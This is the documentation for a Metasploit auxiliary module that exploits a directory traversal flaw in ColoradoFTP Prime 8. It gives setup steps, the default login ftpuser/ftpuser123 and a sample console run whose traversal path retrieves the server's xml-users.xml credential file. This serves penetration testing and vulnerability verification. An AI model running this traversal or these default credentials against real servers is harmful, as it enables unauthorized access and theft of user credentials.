## Notes

While the application is based in java, I was only able to get it to exploit against Windows based targets.

## Vulnerable Application

  [official site](http://cftp.coldcore.com/files/coloradoftp-prime-8.zip?site=cft1&rv=19.1&nc=1) or [github backup](https://github.com/h00die/MSF-Testing-Scripts/raw/master/coloradoftp-prime-8.zip)
  
When installing, you must edit conf/beans.xml line 183 "remoteIp" to put in your IP or else `pasv` won't work.

## Verification Steps

  1. Install the application
  2. Start msfconsole
  3. Do: `use auxiliary/scanner/ftp/colorado_ftp_traversal`
  4. Do: `set rhosts <ip>`
  5. Do: `run`
  6. You should get the xml-users.xml file

## Options

  **FTPUSER**

  Default user for Colorado FTP is `ftpuser`

  **FTPPASS**

  Default password for Colorado FTP is `ftpuser123`

  **DEPTH**

  Default depth of ../ to do is 2 to get back to the root of Colorado FTP.  This can run anywhere, so you may have to play a bit to find the root.

## Scenarios

  A run to obtain the user file (default in this case)

    msf > use auxiliary/scanner/ftp/colorado_ftp_traversal
    msf auxiliary(colorado_ftp_traversal) > set rhosts 1.1.1.1
    rhosts => 1.1.1.1
    msf auxiliary(colorado_ftp_traversal) > set verbose true
    verbose => true
    msf auxiliary(colorado_ftp_traversal) > exploit
    
    [*] 1.1.1.1:21      - Connecting to FTP server 1.1.1.1:21...
    [*] 1.1.1.1:21      - Connected to target FTP server.
    [*] 1.1.1.1:21      - Authenticating as ftpuser with password ftpuser123...
    [*] 1.1.1.1:21      - Sending password...
    [*] 1.1.1.1:21      - \\\..\..\conf\xml-users.xml
    [*] 1.1.1.1:21      - 150 Opening A mode data connection for \\\..\..\conf\xml-users.xml.
    
    [*] 1.1.1.1:21      - Data returned:
    
    <users>
    
      <user name="ftpuser" pass="ftpuser123"/>
    
    </users>
    [+] 1.1.1.1:21      - Stored conf\xml-users.xml to /root/.msf4/loot/20160918184409_default_1.1.1.1_coloradoftp.ftp._168381.xml
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
